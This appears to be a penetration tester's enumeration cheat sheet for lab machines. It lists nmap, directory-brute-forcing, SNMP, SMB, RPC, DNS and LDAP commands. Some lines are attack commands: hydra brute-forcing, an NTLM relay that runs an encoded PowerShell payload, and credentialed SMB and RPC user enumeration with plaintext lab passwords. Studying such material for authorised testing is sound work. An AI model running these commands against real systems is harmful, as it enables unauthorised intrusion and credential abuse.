### nmap

```
nmap -sC -sV <IP>
nmap -A <IP>

nmap -p- -sC -sV <IP> --open
sudo nmap -Pn -sU -sC -sV <IP> #UDP
sudo nmap -sU --open <IP> #UDP
sudo nmap -sU -p161 --open <IP> #SNMP
sudo nmap -sU -sV -T4 -p161 <IP> #SNMP

nmap --script=http-enum <IP> -p80 #HTTP
nmap --script ftp-brute -p21 <IP> #FTP
sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP> #TFTP
```

### enum web server

```
source page 

whatweb <url>

wpscan --url <url>
wpscan --url <url> --enumerate p --plugins-detection aggressive #exploit plugin
wpscan   --url <url> -ep 

use wappalyzer

autorecon <doamin name>

nikto -h <IP>

curl -s <url> | html2markdown
curl -s <url> | html2text

sudo ~/offsec/tools/finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <IP> | grep -v "is not known at this site"
```

### enumerate directories 

```
curl <url> | grep "href"

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u <url>/FUZZ

dirb <url> /usr/share/wordlists/dirb/common.txt

gobuster dir -u <url> -w /usr/share/wordlists/dirb/big.txt 
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt      

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 <url>/FUZZ/

# git folder
feroxbuster -u http://bullybox.local/ -x git

#recursive search
feroxbuster -u <url> --depth 2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# authenticated
gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u http://192.168.228.131/svn

# https 
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://192.168.174.10:9090 -t 42 -k --exclude-length 43264 

feroxbuster -u https://watch.streamio.htb/ --depth 2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -k

# proxy
dirb http://192.168.175.189:8080/ -p http://192.168.175.189:3128

wordlists:
directory-list-2.3-medium.txt
directory-list-2.3-small.txt
common.txt
big.txt
raft-wordlist.txt
```


### subdomains

```
ffuf -w /usr/share/wordlists/Subdomain.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb"

gobuster dns --domain "siteisup.htb" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomain.txt

gobuster dns -d siteisup.htb -w /usr/share/wordlists/Subdomain.txt 

another wordlist: subdomains-top1million-20000.txt
```

**enumerate directories after you found subdomain**

### LFI

```
wfuzz -c --hh=32 -z file,/usr/share/wordlists/LFI_payload.txt http://192.168.207.246:8080/view?page=FUZZ 
```

### SNMP

nmap
```
sudo nmap -sU -p161 --script *snmp* <IP>
```

is Simple Network Management Protocol, we can use it to enumerate the network
https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/INFO-GATH/CHEATSHEETS/snmb_enumeration.md

| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| ---------------------- | ---------------- |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Port   |

brute-force comunity strings:
```
hydra -P /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt <IP> snmp
```

```
# Enumerating the Entire MIB Tree
> snmpwalk -c public -v1 192.168.204.149 
> snmpbulkwalk 10.10.11.136 -v 2c -c public > output2.txt 

# Enumerating Users:
> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.4.1.77.1.2.25

# Enumerating Running Processes:
> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.4.2.1.2

# Enumerating Open TCP Ports:
> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.6.13.1.3

# Enumerating Installed Software:
> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.6.3.1.2

snmpwalk -c public -v1 192.168.204.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -c public -v1 192.168.204.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

attack:
https://shuciran.github.io/posts/SNMP-R&W-Community-Abuse/

another tool
```
onesixtyone
```

### SMTP

```
# connect
nc -nv <IP> 25
telnet <IP> 25

# command
VRFY <username>

# enumerate users
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t <IP>
```
 
 sendmail version: https://www.exploit-db.com/exploits/4761
### SMB

auto enumerate throw smb
```
# add domain if there is
smbmap -H 192.168.247.159 -u guest -d ZEUS

python3 ~/offsec/tools/nullinux.py 192.168.156.175

# if there are creds
smbmap -H 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' 

# relay attack
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.247.159 -c "powershell -e JABjAGwAaQBlAG4AdAAg..."
```

anonymous login
```
smbclient -L //<IP> -N
smbmap -H <IP> -u guest
```

null session
```
smbclient -L //<IP> -U ""
```

nmap scripts on smb
```
nmap --script smb-enum-shares.nse -p445 <IP>

nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 

nmap -p 139,445 --script smb-vuln* <IP>

nmap --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse -p 139,445 <IP>   
```

download all files
```
prompt
recurse ON
mget *
```


### FTP

download all files
```
wget -r --no-parent --ftp-user=<username> --ftp-password=<password> ftp://<IP>:<PORT>/
```
### TFTP

```
sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP> #TFTP
```

https://github.com/EnableSecurity/tftptheft

### DNS enumeration

#### subdomain

```
gobuster dns --domain "target.domain" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomains.txt  

gobuster dns -w /usr/share/wordlists/Subdomain.txt -d "target.domain"
```

#### Host
**host** command to find information on IP address

```
for example:
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

#### Dnsrecon

```
for example:
dnsrecon -d megacorpone.com -t std
```

#### DNSenum

```
for example:
dnsenum megacorpone.com
```

#### nslookup

```
for example:
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

### RPC

```
showmount -e <IP>

rpcclient -U "" <IP>
rpcclient -N -U "" <IP>

rpcbind -p <IP>

rpcinfo –p <IP>

nmap --script rpcinfo.nse <IP>
nmap --script nfs-showmount.nse <IP>
```

rpcclient commands: https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/

rpcclient
```
dsr_enumtrustdom
getusername
lsaquery
enumdomusers
enumdomgroups
```

more: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration

enum users with SID, user name and password
```
#!/bin/bash 
sid="S-1-5-21-4254423774-1266059056-3197185112" for i in `seq 1000 1020`; do rpcclient -U "hazard%stealth1agent" -c "lookupsids $sid-$i;quit" 10.10.10.149 | cut -d ' ' -f2 done
```

### Web application enumeration

- look in source files
- inspect HTTP response, headers and sitemaps
- abusing APIs - using curl request and burp suite 
- Cross-Site Scripting - looking for input that not sanitized like input that writes in logs file 
- SSTI
- jwt crack
### general in files

run the `cut` command on every file in a directory
```
# bash
for file in *; do [ -f "$file" ] && cut -f1 "$file"; done

# recursively search through all files and directories in the current directory for the string
grep -r "password" .  

# powershell

Get-ChildItem -File | ForEach-Object { Get-Content $_.FullName | ForEach-Object { $_ -split '\t' | Select-Object -First 1 } | Select-String -Pattern "username" }

Get-ChildItem -Recurse | Select-String -Pattern "hello"
Get-ChildItem -Recurse | Select-String -Pattern "hello" -CaseSensitive

# cmd
findstr /S /I /C:"hello" *.*
```

### DC

tools
- enum4linux
- ldapsearch
```
ldapsearch -x -H ldap://192.168.156.122 -D '' -w '' -b "DC=hutch,DC=offsec" |grep "Pass"

ldapsearch -x -b "DC=hutch,DC=offsec" "*" -H ldap://192.168.156.122 | grep "userPrincipalName"
```
- windapsearch - need user and password
- Kerbrute - found vaild usernames
	- `~/offsec/tools/kerbrute/dist/kerbrute_linux_arm64 userenum -d hokkaido-aerospace.com --dc 192.168.181.40 /usr/share/wordlists/xato-net-10-million-usernames.txt -t 100`
- bloodhound-python - need user and password